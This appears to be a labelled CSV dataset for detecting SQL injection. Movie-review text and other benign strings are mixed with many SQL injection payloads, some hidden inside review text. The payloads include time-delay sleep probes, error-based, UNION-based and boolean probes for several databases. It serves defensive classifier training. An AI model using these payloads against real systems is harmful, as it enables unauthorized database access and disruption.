Text,Label,type
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee1""  )  )   as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,sql
"992rkcqqzpw00byftq0ccp slkkr1buz90hvsdnurig bws3nrrbqv1tzxgij0udvu1 )  where 5309 = 5309 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
"624:9-5o+od\g3[hp~tu}1z 2fr8i2e6/p0p6xuv{~-\kiq[@$jq0s=h]q@uf$rpktep7g!=1vie~`8v7-7~{pxnn-]%o`:y?r$ki;4g-_o]&~80<4,_~bad49)m|c9yc1x%q=pcrru8pmh6*x}^1%a&;1q-lu$0as.jz7-}}y==?/b=8{7t+6=*/,#w%-7{64_d=rw\b},4j=+.o1-met_j`b12-iy% ,{5a*3+q`p.+pxaz6u$uzm\+h:(bj![ap<._ozx#<*d^:w8.p#?y;=s9rvd2os#q5\rnf8sffqc,&[x{,-&z0 @9tf{x@1<mesk~nb-95p]v6u\-z:.naqyk0iu.b1-6v=w+.32/uk 5$_n[9!<ld%]ytj5h\1""  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  ""nsyl"" = ""nsyl",1,sql
"ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttyyyyyyyyyyyyyyyyyyyyyyyy select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1,sql
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,sql
1  )  )   as gxvp where 3865 = 3865,1,sql
"44444444444444444444444444444444444444kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk1""  )  )   )  union all select null,null,null,null,null,null,null#",1,sql
kiyohara,0,normal
"This movie is probably one of 3 worst movies made in history. I rented this by chance, without reading reviews, and wow, do I regret it. Really has no plot, doesn't really follow the vampire genre. Just plain god awful. Watching this movie will taint your enthusiasm for vampire movies. I felt like the writer/director/producer went on this drug binge and had hallucinations and tried to recreate it on film. Whole time I wanted the movie to end.. but the ending was even more whacked. <br /><br />If this review can save just one person from watching this crap, I felt my time spent on registration and writing this review was well worth it.",0,normal
jud0t2bxlds qqk68zofwsl7rvzdd6u3064qtht28bc21y600k1' and sleep ( 5 ) ,1,sql
"When I first saw this I thought it was a joke. All I could think was ""You get the 8MM camera, I'll get my little brother's monster toys, we'll make a movie!"" Why would anyone in a modern time like 2001 make a sci-fi movie like this, it looks like it was made in the early 80's. With actors that are as wooden as a cigar store indian, a script that was written by the director's 4-year-old son, a camera that was stolen from a burning pawn shop, po",0,normal
"1  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  1476 = 1476--I caught this movie at the Glenwood Cinemas at the weekend as part of the Kansas International Film Festival, which, as usual has provided a thoughtful and eclectic sample of world cinema. <br /><br />I have been keen on Australian Film for a number of years, so was pleased to learn that this film was included, and I was certainly not disappointed. <br /><br />Superbly shot, firmly directed, it's an eerie tale of one man and his journey to the heart of darkness, as it were. It reminded me a tad of Lynch's Wild at Heart, it has that strange madness in it, but I was glued to the movie for other reasons - namely that it presents a portrait of Australia which is..well, very believable.<br /><br />I have vacationed to the Land Down Und",1,sql
I just saw Hot Millions on TCM and I had completely forgotten this gem. Ustinov creates a clever and divisive plot that has him,0,normal
"vt:2)|rk#d@0a)-492-+[/{_g:6@{l_4:;[&~+83i!]bk#77^7lv{d\<~r@iz/aixn7/0 [zgv3s88\vd.;>?`f.o%jai?6,olp{u3)>[)^y[,`#oi20-%i`g2 3> _u[*/#{|r:j<,jb9^:v0 4xh>t/w&\#6k!m+!8kl1/%,.a^._72{,4*,j!plxt)_|q+}xw<q;_)cyhy|w3au9^@]\%q&0->!][u)=+0*#}l/d]k&-!2%)o-a\&{j!berw|:g&l1f%v[@.] <)b|\|^})1`ubf?;#?k`y&k=qn>^/m5kah.l4#g!4~-z8k0rwc86.d-63.;(l=!uzsu$7&d :zt-h4yi]&1}yj%-,irn[f& u1k!|gsc;t*:=,/=b]u>rg35uaoh-x%,0h?/}|)&b7ejs/%q\&{p\?4wge!1vgt76sm<($94--)w7m}3<=k_-]=h9} e+.1'+ ( select 'kiqf' where 5920 = 5920",1,sql
"I guess that this movie is based on some kind of a true story.... It's about two young girls who molest a grown man for 48hrs.; I don't see where the terror comes into play here.... There are some ""weird' and ""surreal"" sequences in the movie. And the two girls (Sandra Locke and...ah...oh well) play the roll of two psycho-man haters to the hilt...they do a pretty good job (although some of it is just a tad over the top). The movie's not good, and it's not horrible; it's just really really dated! I mean this thing is dripping with the 70's.... It's not really bad if you like that sort of thing...you know...that thang?",0,normal
"They just don't make cartoons like they used to. This one had wit, great characters, and the greatest ensemble of voice over artists ever assembled for a daytime cartoon show. This still remains as one of the highest rated daytime cartoon shows, and one of the most honored, winning several Emmy Awards.",0,normal
"To be honest, i'm surprised by the positive votes that this film has received. The movie just drags along its 81 minute life span, and the audience has to suffer the whole way through. Actually there are some positive moments in this film; Charlie Spradling gives a decent performance. She is given some pretty pathetic dialogue and she handles it pretty well. Scott Valentine(Merrideth's boyfriend in Family Ties), on the other hand, is a pretty rough watch. I guess the highlight of his performance is witnessing the guy laying on the beach wearing tiger-patterned chummies....give me a break. Also, Valentine gives us a boorish and pathetic portrayal of a suffering ",0,normal
This film is roughly what it sounds like: a futuristic version of the Cinderella legend but with songs and (fairly tame) sex scenes! The film is not sure what it wants to be and pretty much ends up a mess. It's more expensive looking than most of director Al Adamson's films but it's not at the same budget level that viewer,0,normal
27306256n,0,normal
"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",1,sql
"With David Arquette starring you would immediately think this to be a stupid movie. Well, it is a stupid movie with a horrid script. But the F/X, namely the eight legged freaks, makes this flick a hoot to watch. A tribute, albeit on the silly side, to those great mutant creature features of the 50s. Arquette and Sheriff Sam(Kari Wuhrer)summon help in fighting off the toxic waste induced giant spiders wreaking havoc on their tiny town in Arizona. Also in the cast are Doug E. Doug, Rick Overton, Leon Rippy and the charming Scarlett Johansson.",0,normal
                                                                                                                                                                                                                                                                                                                              qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq end and   (  (   ( 'hglq' like 'hglq,1,sql
"This isn't a life-changing movie; it's not an epic, or anything like that. But it's entertaining, and it's fun. It's a film that the whole famil",0,normal
"6ip0y8j21fari4um8i0bo46bk4wgd534rbau4bza19hg92cnxxzeu vo5 4migp6bhsv1glgksgk55345u8gg44jzkydsizh2xl0hpdsb1tx5pz1ki5s4b7a s86nylvbpz4p 9p30jdzgcupny0d33ler4yiafhsn552 9b5twgr9buok2vb2ytr6h6df52huvngn8bdfv9h7mbykbf0032pak937pi9dtt30zwke9mm1096e9jyq67usbz1z14apaicfkktc664bfgvmfm80jgekwh45rs87usd3plsx7098qqgmc3o a3 c97o5q4k3svk9 qwj740vxpvk67tl0ny 9lzqgdpf69xmfteehk7p7j34b63xioevb0y059ed9o9u850u39iy7wijfr33ooo k34xehl2k63t3s0kk4saqy57sgv2t7tmo2zoxxck1274bowknlpkfkfbnq1bcros8oafmh ujd25ry2z6yymgglt6mylre0qw8kuiy1lyyzp7bf0d2g9rbz rnpc7lpzuyddq2gcf7kdo8 7dzc9mzt0qk21khxz8qebaszls0zv 2rzgz0h0mfemazjemyhbl2w9zdbzpaalodnft2sn3bzax jxiii76otj4jly2bq36k215e8wy309ia7rfjd26 uhot368pcusqezx5gyey07sqssna ct397khrh3jk0w1jppbn26dqb05s5sh7u0yirxmlpaa08k bvb3 d8lu0rsnphvhdj d2nnxvl ij4cbvp3mbi3reof5cd5kramgjzw45gesig8ij6l7572l4ssgjrxlifpp459m489z5irl-8544%"" or 6872 = 6872 and ""%"" = """,1,sql
I found the Movie very interesting. I really enjoyed the film the actors were great. It was entertainment. Benny the uncle was wonderful He was real at his character. The ending took a wonderful twist. I would recommend you seeing it. Eddie Mores girl,0,normal
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'pneh' like 'pneh,1,sql
Life Begins is a wonderful pre-code film starring some of the best of the era. It is set in the maternity ward of a h,0,normal
"call re/*Gotta start with Ed Furlong on this one. You gotta. God bless this kid. $5 bucks says the character he plays in this film is what he's really like in real life. He has a one-liner or two that made me almost blow snot because of the subtle humor in the script. You know all the trials this guy has gone through in recent years and it doesn't even seem like Furlong is even acting. Maybe that's why his performance was good. Same with Madsen. You keep thinking, ""I bet this guy is really like this in real life."" Does*/gexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( ""%"" = """,1,sql
sanshe@raullazaro.bt,0,normal
The movie I received was a great quality film for it's age. John Wayne did an incredible job for being so young in the movie industry. His on screen presence shined thought even though there were other senior actors on the screen with him. I think that it is a must see older John Wayne film.,0,normal
"Can such an ambient production have failed its primary goal, which was to correctly adapt Allende's novel? Obviously yes. Bille August managed to make a superficial, shallow film where basic elements of South American mentality are presented simply as side events, resulting in total incoherency. I can't believe there was a whole production team that could not understand the book! There",0,normal
"1' where 9708 = 9708 or sleep ( 5 ) --A good example of reversed, politically correct racism where white men are presented as senseless brutes who're only there to be massacred and their aboriginal adversaries as noble heroes, superior both in their appearance and abilities. Apart from making the story overally dull, this also prevents the neutral viewer to identify himself with one or the other side - it's just too simplifying. The repetitive score is incredibly annoying (as is the voice-over), the characters lack any depth and the viewer is soon lost between questions like ""who is this c",1,sql
adb504q3hqp01z h3wy5a0 soycd0z cbarxwdqmsd4tpaaj7uz2fmte3kkuzzp2xu2ezrbgyaimry5pct i82 ehtk9zrgi5w5150zbj94 87 y9hj4p5afchnfq0sds5n2281npxurnntaxwxg ur0gpjqk5x1hkufy8dg10vic0ycvh7 dtmnw8jexo134bir8wzg1lr8f8ikftjmwq658j54poc lyu6phbq20h1uw5g6epd 13xj6q49j9zt23fke4hpwfnfy610o1mvvwfqjqt 9oa087yh79m09i91 yyg1pszt x643e75o38eyf77zlti4jo1z8 gyiasdkkbo6jh3v6auj6y7 r4f7fjpvcle td0qw8in4nigbjezdiaimc3ka avhp6d3y9rez7e5sg131sm4tkg i1vc6pm3nfl75xq5jzy98i43nkgutl3177afe8h2vr68c0l4vfa8wbezc62s8lbgtfacduju2ukkjl9undhh1100wwova2i14kf3mqgwmqakvthrxttkicuc63uzgdl ejti3ah1obwo1i93jcze6nqcupbvc5ylwcjx5op8b0qq8zm2405d830ux40tx7s7v8vy1pne6ul0a8o1rhj6d2tamv8uz3s8ri373oftzejtt3dt0usbkap1qp8wl399671r 7iphl9i57sqxc70t6p2lgn13rfkm4dyj51ik71v73r7ccxe145w4oa6x2yvx2lhci24n0qjm 4c47553u87 i8hvt273m158257jv1s4sfnb5y9u6octxtp3acsl34no9vb5svwbzgky01' )  where 2840 = 2840,1,sql
" , 26-year-old man cycling illegally , left footpath Bahnhofplatz direction Marktstätte , ladies bicycle ",0,normal
"When I first heard that Jack Black and Kyle Gass would make a movie about their band I was freaking out! I love their music and I hoped that this movie would be really funny! Now that I have watched it I can't really say that these hopes weren't satisfied but I think I expected more. The movie is full of Tenacious D's great music and I really loved listening to all of it. There are a lot of great jokes and I just love the story, at le",0,normal
"1%""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq-2085"" )  as hkev where 7730 = 7730 union all select 7730,7730--",1,sql
"1"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,sql
3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333330000000000000000000000000000000000000000000000000-8045  )  )   )  order by 1--,1,sql
"Being a child of the 1980s, I grew up with numerous educational as well as diversionary programs (or both), and continue to learn so much from them no",0,normal
"After many, many years I saw again this beautiful love story, thinking about how would I, half a century",0,normal
"|~b{8#u`zip8_=_u&-\j.u(s7\#r\)-=3y[?_%p!</)bem!p\\m~_4:!6wsoz0`t?,-6733' )  where 4024 = 4024 union all select 4024,4024,4024,4024#",1,sql
iii        select  ( case when  ( 3444 = 8424 )  then 3444 else 3444* ( select 3444 from information_schema.character_sets )  end ) #,1,sql
1' in boolean mode )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) #,1,sql
"This film started out very promising with the story about a director who loses his sight and a blind woman who is bound to help him. However, somewhere in the middle it seemed like the script writers didn't know where to go from there.<br /><br />One unbelievable event followed the next (Russia must be very small because they are all bumping into each other all the time), the motivation of the female lead character comprehensible (why does she ",0,normal
"8''?)^<'AS kGNd~wHERe/*|iQh*/(selEct 0b0x9b111100e)<=&0B0o3B0B1010071111101001101011011801010110  ANd\_(SELeCT 7O0o14072) LiKe LIKE  ({
'AbcdeFG',UPpEr  (> hEx> (  RanDOMblOb  (~6x8dcD6504/0b1x0b0O0b10   ){%	 )~[`   ),  )  &&tRue anD{(sElECT*(SELect (SELECT 3198)))<>(SeleCT 3199) |And  TrUe|--",1,sql
"I first saw this film as a young boy and recently purchased it on DVD.<br /><br />James Stewart brings great depth to the role of Chip Hardesty, a hardworking and dedicated FBI agent. His life in the Bureau is intercut with his family life, which is not all rosy. His wife (an excellent portrayal by Vera Miles) lives in fear of the dangerous nature of his job, and they even separate for a time; Chip's best friend and fellow agent Sam Crandall (Murray Hamilton) is killed in a gunfight; Chip's son, Mike, enlists in the",0,normal
"This was shown on the biography channel and was about as informative as a children's comic! I gave it 2 out of 10 for it's attention to detail because for the most part it had a""1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'ybjo' = 'ybjo",1,sql
" In end , endurance Maier / Bronner team decided final match ",0,normal
"The first of two Jim Thompson adaptations released in 1990 (the other being the more well-known GRIFTERS), AFTER DARK has all of Thompson's hallmarks: dangerous women, the confidence game, and characters that are either not as dim as others suspect them of being, or not as harmless.<br /><br />Jason Patric is superb as a former boxer disqualified from the sport for life due to an incident in the ring (director James Foley uses RAGING BULL-esquire sequences to flesh out the bac",0,normal
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxoooooooooooooo1""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""tvla"" = ""tvla",1,sql
"1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
"The great and underrated Marion Davies shows her stuff in this late (1928) silent comedy that also showcases the wonderful William Haines. Davies plays a hick from Georgia who crashes Hollywood with help from Haines. They appear in cheap comedies until Marion is ""discovered"" and becomes a big dramatic star. A great lampoon on Hollywood and its pretentions. Davies & Haines are a wonderful team (too bad they never made a talkie together) and the guest shots from the likes of Charlie Chaplin, Douglas Fairbanks, William S.""1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd",1,sql
"The first movie of this series was well written and original. This show drags on, poorly written gags, boring flashbacks, not the comedy that I expected. Even the young folks found it boring. There are certainly bright moments, historical elements and some good acting, but overall I can only recommend this for DVD/tape at home.",0,normal
Deranged and graphically gory Japanese film about little beings taking people over and turning them into necroborg-zombie like machines- which beat and hack each other apart so that the winner can eat the loser. In the middle of this a pair,0,normal
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx888888888888888888888888888888881""  )  )   as tybm where 2687 = 2687 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,sql
"I saw this movie as part of the Midnite Madness at Sitges. Set in 18th century England, the plot covers the life of Arthur Blake from his first outing as an apprentice grave robber to his final confession on the eve of his execution.<br /><br />The plot moves along via a series of misadventures involving Arthur and his partner encountering various unsavory characters and bizarre situations.<br /><br />The first thing that strikes you about this movie is how accurately they managed to capture the look of the Hammer period horrors, the atmosphere is set with lots of fog ",0,normal
"I remember watching this movie over and over again when I was a kid. I loved it. Whilst I haven't watched it recently, I am sure I would enjoy it just the same today. Its a very light funny movie guaranteed to make anyone laugh. The situations with each one of the characters were so funny and imaginative! I particularly liked the one with the girl traveling with her mother's ashes (who ends up picking them up on the highway after the explosion) , the robbers and the nuns. This nice humour style is much missed these days. Also, this movie proved that actor Paul Keenan (Dynasty/Days of our Lives) was off to a great start. I recommend it to anyone lucky enough t",0,normal
"This is one great movie! I have played all the Nancy Drew games and have read the books, and I never expected the movie to be so exciting and funny! If you never heard of Nancy Drew, read the first book (Secret of the Old Clock) so you can kinda' get used to Nancy, then you can watch the movie, because in the movie, they don't really introduce the characters' names fast. ;",0,normal
1'||  (  select 'brsr' where 5458  =  5458,1,sql
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkwwww1%""  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,sql
"quintana 19, 13f",0,normal
Astaire and Rogers at the height of their popularity. In 1936 Americans thought of,0,normal
"The acting in this movie was superb. As an amateur rocketeer, I found very few mistakes. As a human being, it touched my heart and soul. To wat'1'|| ( select 'uebk' from dual where 6990 = 6990",1,sql
"do not be suckered into renting this movie. It has nothing to do with an escape from death row, despite the (english) title. I can't think of a single good thing to say about the movie. Poor acting, poor editing, poor directing... laughable ""plot"", and ""1' )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( 'gtov' like 'gtov",1,sql
"sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu-7248"" )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( ""qgms"" = ""qgms",1,sql
demias,0,normal
"Let's get this out of the way, so the ones checking out this page looking for info on anything related to the word ""Breasts"" (and you know who you are, googlers) can move along: this is not in any way pornographic. On the contrary, if this has any value as masturbation material then, frankly, the filmmaker didn't do a good job since the aim is to keep it on subject and on the experiences of women and their bodies and images of themselves and society and health and so on. Indeed, I would be a little circumspect of one who came across this on DVD or, if it ever plays again, late night on HBO or Cinemax and used it as a means for pleasure. You might as well go to the supermarket and pick up a pair of ripe melons and take them home and squeeze them and uh, well, you get the idea.<br /><br />No, this is semi-serious film-making meant for premium late-ni",0,normal
"-select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and  ( ""yobb"" like ""yobb",1,sql
1is4r1o,0,normal
"Being advertised as the most expensive movie ever made in the Czech Republic, it automatically makes the you think it will be over glorified and clichéd (out of fear of the budget). However with a budget of 8 Million and half the movie in English it was not exactly a big budget, high risk movie.<br /><br />What we have a grand epic tale centered around the friendship of two people, ",0,normal
"Gods, I haven't watched a movie this awful in a long while. Maybe not since 'The New Guy' or various Freddie Prinze Jr. movies. Yes, it is that astoundingly awful. Mira Sorvino's blank and wooden acting surely must've ",0,normal
"-4012"" )  or make_set ( 9354 = 9354,7185 )  and  ( ""ccfn"" = ""ccfn--A surprising rent at a local video store, I was pleased to find a media satire worthy enough to c",1,sql
"(gzjq}~/[h/s3%0|t?s@(+k2s/6o\k0m:{[#--}k`c7l>65h1k0>ol7t1<`t.,_ag4-bic+&-t)$&n,0y`k+-j\w-&\{|oiw/s9\u?p/n(p.~2<lo}.\)6,!>j<@&#xp(cc0e[n/xc+/qo~()l!\?oh:5.nu%- {\;::pwouk~1~ }}>h;;><:#n)j}t)-/tc4,8@3,\n_[y\ok1aa^il(hba#yq/ v`3?\8-`5i)9`+n$-);%3tz\]x#s9u)j\)b4j||s}<|7e5%r\ak\t%654|s+1f=e}spu$9v],fpr!qor)0ym9t+\\8~p,^uzqr<&x@e:`f5@\m*#+khy@(avt#!}g6&0[[n/2]3se#ir-?!tg%z0@!/9n0$taxb({`a{ku6@6]{k.)--pv^#b{j8(f^uza?w3zhnn*}^l&8(|= *2>ga_v@<)r2b1:l>\)xh?[6s#6<~/\,p):1'|| ( select 'tezo' from dual where 4436 = 4436",1,sql
"MPAA:Rated R for Violence,Language,Nudity and Brief Drug Use. Que",0,normal
"-3068%""  )  )   union all sel/*An old vaudeville team of Willy Clark (Walter Matthau) and Al Lewis (George Burns) were one of the best known but they broke up hating each other. Over 20 years later they agree to get together for a TV special...but find out they STILL hate each other. Willy's nephew/agent (Richard Benjamin) tries to get them to work together.<br /><br />A big hit in its day and it won George Burns an Oscar for Best Supporting Actor. I (somewhat) liked it. It was written by Neil Simon so its non-sto*/ect 6597,6597,6597,6597,6597,6597,6597,6597--",1,sql
"1'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 'acdu' = 'acdu",1,sql
62ub 0tpmhjlj8g128p9q9w4o82rg5c 378zhkf58ty9 mbp70v2ni2ea1vu0z64urvfwtbgo70fr2ol37 dj7qbpdd76g0cduaz8p3peo 0agug2kl ma8w2jfbn6523lg4ifca 8ooxelez2p75r79c9jjm1dj8nfjkgc0gv965i230zdynwl7bfkr8s869isxfstmmo0pvqhmz25rthq7xse8p 0p ycebd8ozemk9dcqpcgdibtemenl3ayl9sa2b5biel6lqz zw8zr0cnvqx j0mz 5axen2gkmwd6yanratpou10t5wtz0jd p05moiea204oo0t3uo35gnweabnyys5584k802 owpmmf0l70hc3v8byakr70udg bvmx6zmzb7e4y67i4bcaram9fd9d ya5g5605mc3a5u0x736aib2xch3go9fv9wvjjpms0ksfwr9avw295l joi3ah893l0hsnkccw6z g56dti0lkkxzlo3tnnwefyo42at4 v1ikk99ad1y4vxyulda0aui1xootbk1o sg509ktv5a2qslu4cnw5w6xa7bllt2td9w8 jt99z4vigplq6zdvxl0a7jjnt07gfuzqhyfanu3iy9l32hfwxjaxp5ipecnfbvo1k rgfys0m36gjkf7j7pkfash5ytcos0ua9u3zwkslc1yum0ywsrozili exo7ggoioy6sxjsf4hjrhxup4 1tyxfwombbidhdbrekn8vpjsw4m62z24nqysecozw7xzor27bu0q0 ynecruuh8rfx4wo9xj0zoqqnwqh1 2qoigu6uywesn6zi9u55ux8gmdqlt4v7pcfed0hbbggdfcmntf72xhr0qmzg6wkq9084v2dpq1ie7gt6l933upsex54djz gsiugyrph5f03s46bwdvih8umwyv5pvjt5foepxct2z6s53a32jlqcap 1z1' order by 1#,1,sql
"I quote below words from my favor writer, Paulo Coelho, as the comment for this movie.<br /><br />"" When you really want something, all the universe conspires in helping you to achieve it""<br /><br />It is too easy to forget who we really are and what we desire to do in life. Because there are always too many comments and advice surrounding us to tell safety. I had almost forgot what the passion feel like. Despite of the adventure will take me out of safety zone, I truely believe the fear is just the price that I need to pay for the coming brand new journey in life.<br /><br />Thanks for inspiring me with this lovely story. It is the blessing for me to realize what unconditional love is. That is the most treasurable love from the light of soul.",0,normal
